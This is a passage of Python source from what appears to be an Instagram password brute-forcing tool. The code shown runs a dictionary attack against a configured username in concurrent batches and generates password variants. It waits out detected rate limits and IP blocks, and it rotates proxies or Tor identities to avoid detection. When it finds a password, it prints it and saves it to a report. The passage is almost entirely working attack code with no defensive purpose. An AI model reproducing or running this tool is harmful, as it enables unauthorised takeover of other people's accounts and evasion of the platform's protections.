        logging.info(f"Loaded {len(passwords)} passwords from dictionary")
        return passwords
    except Exception as e:
        logging.error(f"Error loading password file: {str(e)}")
        return []

async def process_password_batch(brute_forcer: InstagramBruteForcer, username: str, passwords: List[str], 
                                semaphore: asyncio.Semaphore, config: Config) -> List[BruteForceResult]:
    """Process a batch of passwords with concurrency control"""
    results = []
    
    for password in passwords:
        async with semaphore:
            password_variants = brute_forcer.generate_password_variants(password)
            
            for variant in password_variants:
                result = await brute_forcer.attempt_login(username, variant)
                results.append(result)
                
                if result.success:
                    return results
                
                if "rate limit" in result.message.lower():
                    logging.warning("Rate limit detected. Pausing...")
                    await asyncio.sleep(random.uniform(20, 40))
                elif "ip blocked" in result.message.lower():
                    logging.warning("IP blocked. Pausing...")
                    await asyncio.sleep(random.uniform(30, 60))
                elif "no response received" in result.message.lower():
                    logging.warning("No response received. Slowing down...")
                    await asyncio.sleep(random.uniform(5, 10))
                
                delay = 3.0 if brute_forcer.session_manager.use_direct_connection else 2.0
                await asyncio.sleep(random.uniform(delay, delay + 1.0))
    
    return results

async def main_async():
    """Main async function for proxy testing and batch processing"""
    try:
        config = Config.load_from_file("config.json")
        logger = setup_logging(
            log_level=config.logging.log_level,
            log_file=config.logging.log_file,
            max_log_size=config.logging.max_log_size,
            backup_count=config.logging.backup_count
        )
        
        proxy_manager = None
        use_tor = False
        
        if config.connection_method == 'proxy':
            proxy_manager = AsyncProxyManager(config)
            print("Testing proxies...")
            await proxy_manager.get_healthy_proxies()
        
        elif config.connection_method == 'tor':
            use_tor = True
            print("\n[!] Make sure Tor is running with ControlPort 9051")
        
        session_manager = SessionManager(config, proxy_manager, use_tor)
        brute_forcer = InstagramBruteForcer(config, session_manager)
        report_generator = ReportGenerator(config)
        
        passwords = load_passwords(config.password_file)
        if not passwords:
            print("No passwords loaded. Exiting.")
            return
        
        report_generator.start_timing()
        
        print(f"\nStarting brute-force attack on '{config.username}'")
        print(f"Method: {config.connection_method.upper()}")
        print(f"Passwords: {len(passwords)}")
        print(f"Encryption: {config.encryption_method.upper()}")
        print("-" * 40)
        
        batch_size = config.batch_size
        semaphore = asyncio.Semaphore(batch_size)
        
        password_batches = [passwords[i:i + batch_size] for i in range(0, len(passwords), batch_size)]
        
        for i, batch in enumerate(password_batches):
            print(f"Processing batch {i+1}/{len(password_batches)} ({len(batch)} passwords)")
            
            results = await process_password_batch(
                brute_forcer, config.username, batch, semaphore, config
            )
            
            for result in results:
                report_generator.add_result(result)
                
                status_msg = f"[{result.attempt_number:4d}] {result.password:<20} → {result.message}"
                if result.proxy_used != "None":
                    status_msg += f" (Proxy: {result.proxy_used})"
                if config.logging.log_response_times and result.response_time > 0:
                    status_msg += f" ({result.response_time:.2f}s)"
                
                print(status_msg)
                
                if result.success:
                    print(f"\n🎉 SUCCESS: Password found: {result.password}")
                    report_generator.end_timing()
                    
                    report = report_generator.generate_report()
                    report_generator.save_report(report, "bruteforce_report.json")
                    
                    if config.logging.log_response_times:
                        brute_forcer.response_tracker.log_stats(logger)
                        session_manager.response_tracker.log_stats(logger)
                        if proxy_manager:
                            proxy_manager.response_tracker.log_stats(logger)
                    
                    return
            
            # Rotate connection after each batch
            if use_tor:
                session_manager.change_tor_identity()
            elif proxy_manager and not session_manager.use_direct_connection:
                new_proxy = await proxy_manager.get_next_proxy()
                if new_proxy:
                    logger.info(f"Rotating to proxy: {new_proxy}")
                    session_manager.create_session()
                else:
                    logger.error("No working proxies available. Trying direct connection...")
                    session_manager.use_direct_connection = True
                    session_manager.create_session()
            
            # Progress indicator
            processed = (i + 1) * batch_size
            if processed % 50 == 0 or i == len(password_batches) - 1:
                elapsed = time.time() - report_generator.start_time
                rate = processed / elapsed if elapsed > 0 else 0
                eta = (len(passwords) - processed) / rate if rate > 0 else 0
                print(f"Progress: {processed}/{len(passwords)} ({processed/len(passwords)*100:.1f}%) | "
                      f"Rate: {rate:.1f} p/s | ETA: {eta:.0f}s")
    
    except KeyboardInterrupt:
        print("\n\n⚠️  Attack interrupted by user")
    
    except Exception as e:
        logging.error(f"Unexpected error: {str(e)}")
        print("\n❌ Error occurred. Pausing instead of crashing...")
        await asyncio.sleep(10)
    
    finally:
        if 'report_generator' in locals():
            report_generator.end_timing()
            report = report_generator.generate_report()
            report_generator.save_report(report, "bruteforce_report.json")
            
            print("\n❌ Brute-force attack completed.")
            if 'report' in locals():
                print(f"Total time: {report['summary']['total_time']}")
                print(f"Total attempts: {report['summary']['total_attempts']}")
                print(f"Success rate: {report['summary']['success_rate']}")
            
            if 'config' in locals() and config.logging.log_response_times:
                if 'brute_forcer' in locals():
                    brute_forcer.response_tracker.log_stats(logger)
                if 'session_manager' in locals():
                    session_manager.response_tracker.log_stats(logger)
                if 'proxy_manager' in locals():
                    proxy_manager.response_tracker.log_stats(logger)

def main():
    """Main function"""
    asyncio.run(main_async())

if __name__ == "__main__":
    main()